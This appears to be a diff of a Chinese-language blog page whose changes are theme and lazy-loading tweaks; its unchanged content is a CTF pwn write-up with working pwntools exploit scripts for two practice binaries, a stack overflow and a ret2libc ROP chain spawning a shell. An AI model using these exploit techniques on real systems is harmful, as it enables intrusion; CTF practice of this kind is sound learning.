@@ -17,8 +17,9 @@
 
 <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.2.0/css/all.min.css" integrity="sha256-AbA177XfpSnFEvgpYu1jMygiLabzPCJCRIBtR5jGc0k=" crossorigin="anonymous">
   <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.5.7/jquery.fancybox.min.css" integrity="sha256-Vzbj7sDDS/woiFS3uNKo8eIuni59rjyNGtXfstRzStA=" crossorigin="anonymous">
 
-<script class="next-config" data-name="main" type="application/json">{"hostname":"pa1r0t.github.io","root":"/","images":"/images","scheme":"Gemini","darkmode":true,"version":"8.13.2","exturl":false,"sidebar":{"position":"left","width":320,"display":"always","padding":18,"offset":12},"copycode":{"enable":false,"style":null},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"/search.xml","localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":true}}</script><script src="/js/config.js"></script>
+<script class="next-config" data-name="main" type="application/json">{"hostname":"pa1r0t.github.io","root":"/","images":"/images","scheme":"Gemini","darkmode":true,"version":"8.13.2","exturl":false,"sidebar":{"position":"left","width":320,"display":"always","padding":18,"offset":12},"copycode":{"enable":false,"style":"mac"},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":true,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"/search.xml","localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":true}}</script><script src="/js/config.js"></script>
 
     <meta name="description" content="pwn">
 <meta property="og:type" content="article">
@@ -180,7 +181,7 @@
   <nav class="site-state">
       <div class="site-state-item site-state-posts">
         <a href="/archives/">
-          <span class="site-state-item-count">29</span>
+          <span class="site-state-item-count">31</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
@@ -286,24 +287,24 @@
 
 <h2 id="hgame2018-flag-server"><a href="#hgame2018-flag-server" class="headerlink" title="hgame2018_flag_server"></a>hgame2018_flag_server</h2><h3 id="开启docker"><a href="#开启docker" class="headerlink" title="开启docker"></a>开启docker</h3><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker <span class="keyword">run</span><span class="language-bash"> -v <span class="string">&quot;<span class="subst">$(pwd)</span>:/ctf/work&quot;</span> -i -t skysider/pwndocker /bin/bash</span></span><br></pre></td></tr></table></figure>
 
-<p><img src="/./../images/image-20230113115308826.png" alt="image-20230113115308826"></p>
+<p><img data-src="/./../images/image-20230113115308826.png" alt="image-20230113115308826"></p>
 <h3 id="程序核心逻辑"><a href="#程序核心逻辑" class="headerlink" title="程序核心逻辑"></a>程序核心逻辑</h3><p>这里有个随机值，输入的值和随机值比较</p>
-<p><img src="/./../images/image-20230113115524208.png" alt="image-20230113115524208"></p>
+<p><img data-src="/./../images/image-20230113115524208.png" alt="image-20230113115524208"></p>
 <p>我准备用逆向的守法，来搞它，写了个cpp，结果运行多次结果都不一样</p>
 <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;time.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;random&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">void</span>)</span></span>&#123;</span><br><span class="line">	<span class="type">unsigned</span>  <span class="type">int</span> v3 = <span class="built_in">time</span>(<span class="number">0</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>,v3);</span><br><span class="line">	<span class="built_in">srand</span>(v3);</span><br><span class="line">	<span class="type">int</span> v8 = <span class="built_in">rand</span>();</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;%u&quot;</span>,v8);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>
 
 <p>giao~~~~~</p>
 <p>然后我只能老老实实找漏洞了</p>
-<p>先是发现可以读取字符串name<img src="/./../images/image-20230113115909861.png" alt="image-20230113115909861"></p>
-<p>找到读取字符串的函数是自己编的<img src="/./../images/image-20230113115811014.png" alt="image-20230113115811014"></p>
-<p>最后v10进行检验<img src="/./../images/image-20230113115933550.png" alt="image-20230113115933550"></p>
-<p>这里看栈分布<img src="/./../images/image-20230113120005292.png" alt="image-20230113120005292"></p>
+<p>先是发现可以读取字符串name<img data-src="/./../images/image-20230113115909861.png" alt="image-20230113115909861"></p>
+<p>找到读取字符串的函数是自己编的<img data-src="/./../images/image-20230113115811014.png" alt="image-20230113115811014"></p>
+<p>最后v10进行检验<img data-src="/./../images/image-20230113115933550.png" alt="image-20230113115933550"></p>
+<p>这里看栈分布<img data-src="/./../images/image-20230113120005292.png" alt="image-20230113120005292"></p>
 <p>直接在s1的下面，直接填充’A’*((0x50-0x10)+size(int))</p>
 <h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">io = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">28388</span>)</span><br><span class="line"><span class="comment"># io = process(&#x27;./flag_server&#x27;)</span></span><br><span class="line">io.sendlineafter(<span class="string">&#x27;your username length: &#x27;</span>,<span class="string">b&#x27;-1&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">b&#x27;A&#x27;</span>*<span class="number">0x44</span>)</span><br><span class="line">io.interactive()</span><br><span class="line">io.close()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
 
-<h3 id="结果"><a href="#结果" class="headerlink" title="结果"></a>结果</h3><p><img src="/./../images/image-20230113120243209.png" alt="image-20230113120243209"></p>
+<h3 id="结果"><a href="#结果" class="headerlink" title="结果"></a>结果</h3><p><img data-src="/./../images/image-20230113120243209.png" alt="image-20230113120243209"></p>
 <hr>
-<h2 id="ciscn-2019-c-1"><a href="#ciscn-2019-c-1" class="headerlink" title="ciscn_2019_c_1"></a>ciscn_2019_c_1</h2><h3 id="核心程序"><a href="#核心程序" class="headerlink" title="核心程序"></a>核心程序</h3><p><img src="/./../images/image-20230113201822956.png" alt="image-20230113201822956"></p>
+<h2 id="ciscn-2019-c-1"><a href="#ciscn-2019-c-1" class="headerlink" title="ciscn_2019_c_1"></a>ciscn_2019_c_1</h2><h3 id="核心程序"><a href="#核心程序" class="headerlink" title="核心程序"></a>核心程序</h3><p><img data-src="/./../images/image-20230113201822956.png" alt="image-20230113201822956"></p>
 <p><strong>利用点</strong>：利用gets，去覆盖栈中的内容，利用rop链泄漏puts函数在内存中的地址，然后通过这个地址去找对应版本的libc，找到内存中system的地址和bin_sh字符串的地址，再利用一次rop链执行system函数即可</p>
 <p>这里有一个模块叫LibcSearcher，它可以让使用者不用担心本地和远程的libc是否统一，它可以帮你去寻找正在执行的libc。非常好用</p>
 <h3 id="寻找rop"><a href="#寻找rop" class="headerlink" title="寻找rop"></a>寻找rop</h3><p>目的：寻找pop rdi ret;指令，因为该文件是64位，而64位文件采用寄存器存放参数，第一个参数存放的寄存器就是rdi</p>
@@ -311,10 +312,10 @@
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ROPgadget --binary ./ciscn_2019_c_1 --only <span class="string">&#x27;pop|ret&#x27;</span></span><br></pre></td></tr></table></figure>
 
 <p>结果：</p>
-<p><img src="/./../images/image-20230113202715207.png" alt="image-20230113202715207"></p>
+<p><img data-src="/./../images/image-20230113202715207.png" alt="image-20230113202715207"></p>
 <h3 id="脚本："><a href="#脚本：" class="headerlink" title="脚本："></a>脚本：</h3><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># io = process(&#x27;./ciscn_2019_c_1&#x27;)</span></span><br><span class="line">io = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>,<span class="number">26320</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;ciscn_2019_c_1&#x27;</span>)</span><br><span class="line"><span class="comment">#</span></span><br><span class="line">encrypt_addr = elf.sym[<span class="string">&#x27;encrypt&#x27;</span>]</span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]	<span class="comment"># 用于打印puts的地址</span></span><br><span class="line">puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]	<span class="comment"># puts函数地址</span></span><br><span class="line">rdi_ret = <span class="number">0x400c83</span></span><br><span class="line">											<span class="comment"># puts函数的参数		puts函数的地址	puts函数执行完的返回地址，用于下一次的shellcode</span></span><br><span class="line">payload1 = <span class="string">b&#x27;A&#x27;</span> * <span class="number">0x50</span> + p64(<span class="number">0</span>) + p64(rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(encrypt_addr)</span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;Input your choice!&#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;Input your Plaintext to be encrypted&#x27;</span>,payload1)</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;Ciphertext\n&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line"><span class="comment"># 拿到puts在内存中的地址</span></span><br><span class="line">puts_addr = u64(io.recvline().strip().ljust(<span class="number">8</span>,<span class="string">b&#x27;\0&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;addr:&#x27;</span>,<span class="built_in">hex</span>(puts_addr))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 找内存libc的地址</span></span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;puts&#x27;</span>,puts_addr)</span><br><span class="line"></span><br><span class="line">addr_base = puts_addr - libc.dump(<span class="string">&quot;puts&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;libc&#x27;</span>,addr_base)</span><br><span class="line">sys_addr = libc.dump(<span class="string">&#x27;system&#x27;</span>) + addr_base</span><br><span class="line">binsh_addr = libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>) + addr_base</span><br><span class="line"></span><br><span class="line">payload2 = <span class="string">b&#x27;A&#x27;</span> * <span class="number">0x50</span> + p64(<span class="number">0</span>) + p64(rdi_ret) + p64(binsh_addr) + p64(sys_addr) + p64(encrypt_addr)</span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;Input your Plaintext to be encrypted&#x27;</span>,payload2)</span><br><span class="line">io.interactive()</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
 
-<h3 id="结果："><a href="#结果：" class="headerlink" title="结果："></a>结果：</h3><p><img src="/./../images/image-20230113203306010.png" alt="image-20230113203306010"></p>
+<h3 id="结果："><a href="#结果：" class="headerlink" title="结果："></a>结果：</h3><p><img data-src="/./../images/image-20230113203306010.png" alt="image-20230113203306010"></p>
 
     </div>
 
@@ -409,6 +410,9 @@
 
   
   <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.1/jquery.min.js" integrity="sha256-o88AwQnZB+VDvE9tvIXrMQaPlFFSUTR+nldQm1LuPXQ=" crossorigin="anonymous"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.5.7/jquery.fancybox.min.js" integrity="sha256-yt2kYMy0w8AbtF89WXb2P1rfjcP/HTHLT7097U8Y5b8=" crossorigin="anonymous"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/lozad.js/1.16.0/lozad.min.js" integrity="sha256-mOFREFhqmHeQbXpK2lp4nA3qooVgACfh88fpJftLBbc=" crossorigin="anonymous"></script>
 <script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/next-boot.js"></script>
 
   
@@ -417,6 +421,7 @@
 
 
 
+  <script src="/js/third-party/fancybox.js"></script>
 
 
   
